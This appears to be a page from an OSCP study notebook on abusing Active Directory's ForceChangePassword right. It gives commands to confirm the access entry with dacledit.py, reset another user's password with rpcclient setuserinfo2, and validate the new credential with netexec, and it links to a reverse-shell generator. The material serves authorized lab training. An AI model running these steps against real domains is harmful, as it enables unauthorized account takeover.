# AD - ForceChangePassword

**Step 45A of 50 · AD**

*Confirm a ForceChangePassword ACL and reset the target account without needing its old password.*

## When to use this page

Use this page when BloodHound or direct ACL enumeration shows that your current account has the ForceChangePassword extended right over another domain user. An ACL is a permission attached to a directory object; this specific right lets you choose a new password for the target account.

## Confirm the ACL

> **Why:** `dacledit.py` reads the target user’s access-control entries; look for `ForceChangePassword` granted to your current account or one of its groups.
```bash
dacledit.py -action read -target $Username2 -u $Username -p $Password -d $Domain -dc-ip $BoxIP
```

## Reset and validate

> **Why:** This RPC request sets a new password for the delegated target account without requiring the previous password; success is a completed command followed by successful authentication.
```bash
rpcclient -U "$Domain/$Username%$Password" $BoxIP -c "setuserinfo2 $Username2 23 '$Password2'"
```

> **Why:** This check proves that the reset credential works over SMB before you rely on it for share enumeration or a later privilege path.
```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
```

## Example output

```text
ForceChangePassword granted
SMB  $BoxIP  445  [+] $Domain\\$Username2
```

## What did you get?

- [ ] The ACL grants ForceChangePassword and validation succeeds → **Run `netexec smb $BoxIP -u $Username2 -p $Password2`, store the credential privately, and go to Step 40 · [[AD - Credential Validation]]**
- [ ] The ACL is absent → **Return to Step 45 · [[AD - BloodHound]] and run its ACL collection command to inspect another writable relationship**
- [ ] The reset succeeds but SMB rejects the new credential → **Run `netexec smb $BoxIP -u $Username2 -p $Password2`, then check `$Domain\\$Username2` and retry the reset once if the account format is wrong**
- [ ] RPC access is denied → **Treat this account/path as a dead end and return to Step 45 · [[AD - BloodHound]]**

## Notes

Do not confuse ForceChangePassword with knowing or cracking the old password. The permission itself is the evidence that makes the reset valid.

## Gotcha

> [!warning] 💡
> Reset only a controlled target account in an authorized lab. Record the original state and remove any temporary account or group changes during clean-down.

## Additional routing

- [ ] The reset credential validates → **Continue to Step 40 · [[AD - Credential Validation]]**
- [ ] The ACL or reset fails → **Return to Step 45 · [[AD - BloodHound]] and inspect another delegated path**
## Seen in
- *(no write-up yet)*

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
